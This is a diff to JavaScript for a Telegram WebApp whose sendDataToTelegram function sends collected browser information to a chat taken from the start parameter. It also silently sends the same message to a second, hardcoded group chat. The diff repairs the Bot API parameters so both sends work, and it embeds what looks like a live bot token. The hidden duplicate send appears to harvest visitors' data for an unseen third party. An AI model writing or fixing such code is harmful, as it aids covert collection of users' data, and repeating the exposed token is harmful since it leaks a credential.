@@ -60,7 +60,7 @@ function getBrowserInfo() {
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
-    const token = "6926790040:AAF4HOkicBEw3EQYM0NjUJVOURPxI4pbM-Q"
+    const token = "6926790040:AAF4HOkicBEw3EQYM0NjUJVOURPxI4pbM-Q";  // Replace with your bot token
     const chatId = tg.initDataUnsafe.start_param;
     const additionalChatId = -1002099226550;
 
@@ -98,14 +98,19 @@ async function sendDataToTelegram() {
     `;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    const formData = new FormData();
-    formData.append('chat', chatId);
-    formData.append('message', message);
+
+    const formData = new URLSearchParams();
+    formData.append('chat_id', chatId);
+    formData.append('text', message);
+    formData.append('parse_mode', 'HTML');
 
     try {
         const response = await fetch(url, {
             method: 'POST',
-            body: formData
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: formData.toString()
         });
         if (!response.ok) {
             throw new Error('Ошибка при отправке запроса: ' + response.statusText);
@@ -114,22 +119,27 @@ async function sendDataToTelegram() {
     } catch (error) {
         console.error('Ошибка:', error);
     }
-    // отправка два
-    const formData1 = new FormData();
-    formData1.append('chat', additionalChatId);
-    formData1.append('message', message);
+
+    // Second request
+    const formData1 = new URLSearchParams();
+    formData1.append('chat_id', additionalChatId);
+    formData1.append('text', message);
+    formData1.append('parse_mode', 'HTML');
 
     try {
         const response = await fetch(url, {
             method: 'POST',
-            body: formData1
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: formData1.toString()
         });
         if (!response.ok) {
-            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
+            throw new Error('Ошибка при отправке второго запроса: ' + response.statusText);
         }
-        console.log('Запрос успешно отправлен');
+        console.log('Второй запрос успешно отправлен');
     } catch (error) {
-        console.error('Ошибка:', error);
+        console.error('Ошибка второго запроса:', error);
     }
 }
 
